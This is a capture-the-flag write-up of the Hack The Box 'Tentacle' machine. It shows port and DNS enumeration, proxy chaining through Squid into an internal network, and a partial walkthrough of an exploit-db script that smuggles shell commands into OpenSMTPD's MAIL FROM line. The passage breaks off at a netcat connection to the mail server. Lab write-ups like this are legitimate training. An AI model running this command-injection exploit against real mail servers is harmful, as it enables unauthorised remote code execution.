<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-proxy-endpoint" content="https://ch1mp3y-16053.ew.r.appspot.com/query?id=ag9lfmNoMW1wM3ktMTYwNTNyFQsSCEFwaVF1ZXJ5GICAgOjXh4EKDA"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HTB-Tentacle" /><meta property="og:locale" content="en" /><meta name="description" content="categories: [Hack the Box] tags: [Tentacle] —" /><meta property="og:description" content="categories: [Hack the Box] tags: [Tentacle] —" /><link rel="canonical" href="http://chimpey.com/posts/TENTACLE/" /><meta property="og:url" content="http://chimpey.com/posts/TENTACLE/" /><meta property="og:site_name" content="Ch1mp3y" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-11T14:45:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB-Tentacle" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="7B-MyW0dy3yjVorlhotvBxXrK4v39i4p1OtKCIAUwJE" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-31T16:11:49+02:00","datePublished":"2022-07-11T14:45:00+02:00","description":"categories: [Hack the Box] tags: [Tentacle] —","headline":"HTB-Tentacle","mainEntityOfPage":{"@type":"WebPage","@id":"http://chimpey.com/posts/TENTACLE/"},"url":"http://chimpey.com/posts/TENTACLE/"}</script><title>HTB-Tentacle | Ch1mp3y</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ch1mp3y"><meta name="application-name" content="Ch1mp3y"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://ch1mp3y-16053.ew.r.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://ch1mp3y-16053.ew.r.appspot.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/RECOVER_Chimpey_vierkant6.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ch1mp3y</a></div><div class="site-subtitle font-italic">Hack all the things!</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Ch1mp3y" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB-Tentacle</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HTB-Tentacle</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1657543500" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 11, 2022 </em> </span> <span> Updated <em class="" data-ts="1659276709" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 31, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Ch1mp3y</a> </em> </span><div> <span> <em id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </em> views </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3576 words"> <em>19 min</em> read</span></div></div></div><div class="post-content"><hr /><p>categories: [Hack the Box] tags: [Tentacle] —</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1400 972'%3E%3C/svg%3E" data-src="/assets/img/HTB/Tentacle/Tentacle.png" alt="Desktop View" width="1400" height="972" data-proofer-ignore></p><h2 id="index"><span class="mr-2">Index</span><a href="#index" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="https://ch1mp3y.github.io/posts/TENTACLE/#enumerating">enumeraing</a><li><a href="https://ch1mp3y.github.io/posts/TENTACLE/#proxy-squid">Proxy Squid</a><li><a href="https://ch1mp3y.github.io/posts/TENTACLE/#exploiting-opensmtpd-200">Exploiting OpenSMTPD 2.0.0</a><li><a href="https://ch1mp3y.github.io/posts/TENTACLE/#the-powers-of-kerberos-combined-with-ssh">The powers of Kerberos combined with SSH</a><li><a href="https://ch1mp3y.github.io/posts/TENTACLE/#exploiting-the-log_backup-script">Exploiting the log_backup script</a><ul><li><a href="https://ch1mp3y.github.io/posts/TENTACLE/#grant-permissions-with-kerberos-k5login-file">Grant permissions with kerberos .k5login file</a></ul><li><a href="https://ch1mp3y.github.io/posts/TENTACLE/#kerberos-keytab">Kerberos Keytab</a></ul><h2 id="enumerating"><span class="mr-2">enumerating</span><a href="#enumerating" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>He! Ho! Let’s go! Starting off with the <strong>Nmap TCP</strong> scan:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sC -p- 10.129.44.237 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-11 14:06 EDT
Nmap scan report for 10.129.44.237
Host is up (0.022s latency).
Not shown: 65347 filtered tcp ports (no-response), 170 filtered tcp ports (admin-prohibited), 15 filtered tcp ports (host-unreach)
PORT     STATE  SERVICE      VERSION
88/tcp   open   kerberos-sec MIT Kerberos (server time: 2022-07-11 18:10:06Z)
3128/tcp open   http-proxy   Squid http proxy 4.11
|_http-server-header: squid/4.11
|_http-title: ERROR: The requested URL could not be retrieved
9090/tcp closed zeus-admin
Service Info: Host: REALCORP.HTB

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.35 seconds


</pre></table></code></div></div><p>First thing that stands out to me is port 3128 which is running <strong>http-proxy squid</strong>. As the name implies this is a web proxy. Port 88 seems to be open. On Windows this would most likely be a domain controller however, it is not a domain controller because it is a Linux machine. It could however be the service that manages Kerberos keys.</p><p>First things first, let’s browse to <code class="language-plaintext highlighter-rouge">http://10.129.44.237:3128/</code></p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 720 516'%3E%3C/svg%3E" data-src="/assets/img/HTB/Tentacle/ErrorPage.PNG" alt="Desktop View" width="720" height="516" data-proofer-ignore></p><p>It seems the error message contains a hostname and an username. I tried ASREProasting and I did receive a hash, the hash however could not be cracked with <strong>Hashcat</strong> or <strong>John the Ripper</strong>, so this feels like a dead end.</p><p>I have obtained however, a dns name: <strong>realcorp.htb</strong>. So we could try to search for subdomains:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ gobuster dns -d realcorp.htb -r 10.129.44.237 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt                                                                                     1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     realcorp.htb
[+] Threads:    10
[+] Resolver:   10.129.44.237
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
2022/07/11 14:16:04 Starting gobuster in DNS enumeration mode
===============================================================
2022/07/11 14:16:06 [-] Unable to validate base domain: realcorp.htb (lookup realcorp.htb on 192.168.191.2:53: no such host)
Found: ns.realcorp.htb       
Found: proxy.realcorp.htb    
Found: wpad.realcorp.htb       

</pre></table></code></div></div><p>We got the following dns names:</p><ul><li>ns.realcorp.htb<li>proxy.realcorp.htb<li>wpad.realcorp.htb</ul><p>Let’s try some reverse lookups using <strong>dig</strong> to see the <strong>IP</strong> addresses:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ dig @10.129.44.237 wpad.realcorp.htb

; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; @10.129.44.237 wpad.realcorp.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 21731
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 16fd19f84fc67f59162de0e762dd3387c6622e047dcad02d (good)
;; QUESTION SECTION:
;wpad.realcorp.htb.             IN      A

;; ANSWER SECTION:
wpad.realcorp.htb.      259200  IN      A       10.197.243.31

;; AUTHORITY SECTION:
realcorp.htb.           259200  IN      NS      ns.realcorp.htb.

;; ADDITIONAL SECTION:
ns.realcorp.htb.        259200  IN      A       10.197.243.77

;; Query time: 19 msec
;; SERVER: 10.129.44.237#53(10.129.44.237) (UDP)
;; WHEN: Sun Jul 24 07:56:56 EDT 2022
;; MSG SIZE  rcvd: 123


</pre></table></code></div></div><p>The <strong>IP</strong> addresses are internal addresses, so we cannot access these directly. However, here is where <strong>http-proxy squid</strong> comes into play</p><h2 id="proxy-squid"><span class="mr-2">Proxy Squid</span><a href="#proxy-squid" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First we need to configure <strong>proxychains.conf</strong>:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>http 10.129.44.237 3128 <span class="c"># External</span>
http 127.0.0.1 3128 <span class="c"># Interface</span>
http 10.197.243.77 3128 <span class="c"># Internal</span>
</pre></table></code></div></div><p>The first <strong>IP</strong> is our external proxy, so all traffic that runs through the proxy tunnel will go through the Squid proxy. The second <strong>IP</strong> routes through the internal interface of the proxy, so now we can reach <strong>proxy.realcorp.htb</strong>. which is <strong>10.197.243.77</strong> And the third IP is for <strong>proxy.realcorp.htb</strong> is used to reach the internal network.</p><p>Let’s see if we can reach <strong>wpad.realcorp.htb</strong>.<br /> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 957 313'%3E%3C/svg%3E" data-src="/assets/img/HTB/Tentacle/ForbiddenWPAD.PNG" alt="Desktop View" width="957" height="313" data-proofer-ignore></p><p>We see a Forbidden page, which is actually not a bad thing because we can atleast reach the website.<br /> If we browse to <strong>wpad.dat</strong> we can see some information:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>──(kali㉿kali)-[~]
└─$ proxychains curl http://wpad.realcorp.htb/wpad.dat                            
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  10.129.44.237:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.197.243.31:80  ...  OK
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";
    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT"; 
    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT"; 
 
    return "PROXY proxy.realcorp.htb:3128";
}

</pre></table></code></div></div><p>Wpad stands for windows proxy auto discover. Windows searches constatly for wpad.dat to autodetect proxies.</p><p>If we look at the <strong>wpad.dat</strong> file we can see a new subnet that we haven’t seen before: <strong>10.241.251.0-255.255.255.0</strong></p><p>Let’s look at the subdomain:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ dnsrecon -d realcorp.htb -n 10.129.44.237 -r 10.241.251.0/24                                                                                                                                               100 ⨯
[*] Performing Reverse Lookup from 10.241.251.0 to 10.241.251.255
[+]      PTR srvpod01.realcorp.htb 10.241.251.113
[+] 1 Records Found

</pre></table></code></div></div><p>We got a new hostname and IP address <strong>srvpod01.realcorp.htb 10.241.251.113</strong></p><p>Now let’s do a fast <strong>Nmap</strong> scan. Running a normal <strong>Nmap</strong> scan will take a very long time because we are routing the traffic through a proxy.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>──(kali㉿kali)-[~]
└─$ proxychains nmap -sT -F 10.241.251.113

Nmap scan report for 10.241.251.113
Host is up (0.100s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE
25/tcp open  smtp

</pre></table></code></div></div><p>We see that port 25 is open which is <strong>SMTP</strong>. Let’s do a more detailed scan to get more information on this port.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ proxychains nmap -Pn -p 25 -sV -sC 10.241.251.113

Nmap scan report for 10.241.251.113
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    OpenSMTPD
| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
Service Info: Host: smtp.realcorp.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.39 seconds

</pre></table></code></div></div><p>This shows us that they are using <strong>OpenSMTPD 2.0.0</strong> and if I remember correctly, there is an exploit for this particular version.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ searchsploit OpenSMTPD    
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSMTPD - MAIL FROM Remote Code Execution (Metasploit)                                                                                                                          | linux/remote/48038.rb
OpenSMTPD - OOB Read Local Privilege Escalation (Metasploit)                                                                                                                      | linux/local/48185.rb
OpenSMTPD 6.4.0 &lt; 6.6.1 - Local Privilege Escalation + Remote Code Execution                                                                                                      | openbsd/remote/48051.pl
OpenSMTPD 6.6.1 - Remote Code Execution                                                                                                                                           | linux/remote/47984.py
OpenSMTPD 6.6.3 - Arbitrary File Read                                                                                                                                             | linux/remote/48139.c
OpenSMTPD &lt; 6.6.3p1 - Local Privilege Escalation + Remote Code Execution                                                                                                          | openbsd/remote/48140.c
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

</pre></table></code></div></div><p>Remote code execution <strong>linux/remote/47984.py</strong> looks interesting!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]
└─$ sudo searchsploit -m linux/remote/47984.py
  Exploit: OpenSMTPD 6.6.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47984
     Path: /usr/share/exploitdb/exploits/linux/remote/47984.py
File Type: Python script, ASCII text executable

Copied to: /home/kali/Documents/Other/HacktheBox/tentacel/47984.py

</pre></table></code></div></div><h2 id="exploiting-opensmtpd-200"><span class="mr-2">Exploiting OpenSMTPD 2.0.0</span><a href="#exploiting-opensmtpd-200" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>So what the script does is a command injection in the ‘MAIL FROM’ line. The script will ask for a <strong>Ip</strong> address, <strong>port</strong> and <strong>payload</strong></p><p>it stores the third argument (which is the payload) into the <strong>CMD</strong> variable as seen below:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Usage {} &lt;target ip&gt; &lt;target port&gt; &lt;command&gt;'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"E.g. {} 127.0.0.1 25 'touch /tmp/x'"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">ADDR</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="n">CMD</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
</pre></table></code></div></div><p>First it checks the connection by sending an <strong>HELO x</strong> response</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>
<span class="k">print</span><span class="p">(</span><span class="s">'[*] OpenSMTPD detected'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'HELO x</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">if</span> <span class="s">'250'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[!] Error connecting, expected 250'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[!] Received: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">)))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[!] Exiting...'</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</pre></table></code></div></div><p>When the connection is succesful it will inject the payload which is stored in the <strong>CMD</strong> variable into <strong>MAIL FROM</strong>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>
<span class="k">print</span><span class="p">(</span><span class="s">'[*] Connected, sending payload'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">'MAIL FROM:&lt;;{};&gt;</span><span class="se">\r\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">CMD</span><span class="p">),</span> <span class="s">'utf-8'</span><span class="p">))</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">if</span> <span class="s">'250'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[!] Error sending payload, expected 250'</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[!] Received: {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">)))</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'[!] Exiting...'</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	
<span class="k">print</span><span class="p">(</span><span class="s">'[*] Payload sent'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'RCPT TO:&lt;root&gt;</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'DATA</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">xxx</span><span class="se">\r\n</span><span class="s">.</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[*] Done'</span><span class="p">)</span>
</pre></table></code></div></div><p>Note that the script sends it to the <strong>root</strong> user however, we found an email address of the user <strong>j.nakazawa</strong>.</p><p>Let’s first connect to the mail server and see if this user exists:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]
└─$ sudo proxychains nc 10.241.251.113 25                                                                                                                                                                     130 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
